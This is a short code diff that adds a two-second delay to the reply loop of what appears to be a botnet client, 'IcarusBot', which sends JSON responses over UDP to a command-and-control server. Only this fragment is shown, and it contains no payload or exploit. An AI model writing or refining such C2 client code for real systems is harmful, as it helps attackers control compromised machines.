@@ -127,6 +127,7 @@ class IcarusBot:
                     }
                     response = json.dumps(response)
                 # This will then send the message back to the server, irrespective of the flag.
+                time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout or Exception:
                 # the server has lagged out
